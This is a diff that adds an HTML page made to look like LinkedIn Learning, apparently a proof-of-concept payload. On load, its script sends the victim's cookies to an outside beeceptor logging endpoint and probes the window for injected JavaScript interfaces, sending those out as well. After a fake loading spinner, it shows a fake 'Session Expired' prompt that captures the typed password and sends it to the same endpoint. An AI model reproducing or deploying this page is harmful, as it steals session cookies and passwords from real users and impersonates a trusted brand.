@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>LinkedIn Learning</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; text-align: center; padding: 50px 20px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0073b1; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .hidden { display: none; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; background-color: #0073b1; color: white; padding: 14px 20px; border: none; border-radius: 25px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div id="loading">
+        <div class="spinner"></div>
+        <p>Loading Course Content...</p>
+    </div>
+
+    <div id="phish" class="hidden">
+        <img src="https://download.linkedin.com/desktop/add_to_network/linkedin_logo.png" width="100" alt="LinkedIn">
+        <h2>Session Expired</h2>
+        <p>For your security, please re-enter your password to continue to LinkedIn Learning.</p>
+        <input type="password" id="pass" placeholder="Password">
+        <button onclick="sendCreds()">Sign In</button>
+    </div>
+
+    <script>
+        const exfilUrl = "https://evilios.free.beeceptor.com/log";
+
+        // 1. Silent Cookie Exfiltration
+        try {
+            const cookies = document.cookie;
+            fetch(exfilUrl + "?type=cookies&data=" + btoa(cookies), {mode: 'no-cors'});
+        } catch (e) {}
+
+        // 2. Probe for JS Interfaces (Impact Multiplier)
+        try {
+            let interfaces = [];
+            for (let prop in window) {
+                // Common check for injected Java objects
+                if (window[prop] && typeof window[prop] === 'object' && !['location', 'history', 'navigator'].includes(prop)) {
+                    interfaces.push(prop);
+                }
+            }
+            if (interfaces.length > 0) {
+                fetch(exfilUrl + "?type=interfaces&data=" + interfaces.join(','), {mode: 'no-cors'});
+            }
+        } catch (e) {}
+
+        // 3. Transition to Phishing after 2 seconds
+        setTimeout(() => {
+            document.getElementById('loading').classList.add('hidden');
+            document.getElementById('phish').classList.remove('hidden');
+        }, 2000);
+
+        function sendCreds() {
+            const pass = document.getElementById('pass').value;
+            fetch(exfilUrl + "?type=creds&pass=" + btoa(pass), {mode: 'no-cors'});
+            alert("Security update in progress. Please try again later.");
+        }
+    </script>
+</body>
+</html>
